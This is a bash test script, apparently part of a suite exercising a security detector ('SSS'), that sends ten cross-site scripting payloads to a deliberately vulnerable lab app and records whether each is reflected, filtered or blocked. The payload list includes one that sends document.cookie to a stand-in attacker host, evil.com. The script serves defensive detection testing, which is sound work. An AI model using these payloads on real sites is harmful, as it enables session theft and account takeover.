#!/usr/bin/env bash
# =============================================================================
# 08 — Cross-Site Scripting (XSS) Attack
# Tool: curl with crafted payloads
# SSS should detect: xss pattern via XGBoost classifier
# =============================================================================
set -euo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/common.sh"
attack_start "08_xss_attack"

VULN_PORT="${VULN_APP_PORT:-8888}"
BASE_URL="http://${TARGET_IP}:${VULN_PORT}"

echo "[*] Verifying VulnApp is reachable..."
if ! curl -sf "${BASE_URL}/health" >/dev/null 2>&1; then
    record_result "false" "VulnApp not reachable on port ${VULN_PORT}." ""
    exit 0
fi

# ---------------------------------------------------------------------------
# XSS Payloads (from basic to advanced)
# ---------------------------------------------------------------------------
declare -a XSS_PAYLOADS=(
    '<script>alert("XSS")</script>'
    '<img src=x onerror=alert("XSS")>'
    '<svg onload=alert("XSS")>'
    '"><script>document.location="http://evil.com/?c="+document.cookie</script>'
    "javascript:alert('XSS')"
    '<body onload=alert("XSS")>'
    '<iframe src="javascript:alert(`XSS`)"></iframe>'
    '<input onfocus=alert("XSS") autofocus>'
    "';alert('XSS');//"
    '<details open ontoggle=alert("XSS")>'
)

reflected_count=0
blocked_count=0
total=${#XSS_PAYLOADS[@]}
evidence_lines=""

echo "[*] Testing ${total} XSS payloads against /comment endpoint..."

for ((i=0; i<total; i++)); do
    payload="${XSS_PAYLOADS[$i]}"
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''${payload}'''))" 2>/dev/null || echo "${payload}")

    response=$(curl -s --max-time 10 \
        "${BASE_URL}/comment?text=${encoded}" 2>/dev/null) || response=""
    http_code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
        "${BASE_URL}/comment?text=${encoded}" 2>/dev/null) || http_code="000"

    if [[ "${http_code}" == "000" ]]; then
        blocked_count=$((blocked_count + 1))
        echo "  [${i}] BLOCKED (connection refused/timeout)"
    elif echo "${response}" | grep -qF "${payload}"; then
        reflected_count=$((reflected_count + 1))
        echo "  [${i}] REFLECTED — payload appears unescaped in response"
        evidence_lines="${evidence_lines}Payload ${i} reflected: ${payload}\n"
    else
        echo "  [${i}] FILTERED — payload was sanitized or not reflected"
    fi
done

echo ""
echo "[*] Results: ${reflected_count}/${total} reflected, ${blocked_count}/${total} blocked"

if [[ "${reflected_count}" -gt 0 ]]; then
    evidence="XSS successful: ${reflected_count}/${total} payloads reflected unescaped in response."
    record_result "true" "${evidence}" "$(echo -e "${evidence_lines}")"
elif [[ "${blocked_count}" -gt $((total / 2)) ]]; then
    evidence="XSS blocked: ${blocked_count}/${total} requests were refused/dropped by SSS."
    record_result "false" "${evidence}" ""
else
    evidence="XSS payloads were filtered/sanitized but connections were allowed."
    record_result "false" "${evidence}" ""
fi
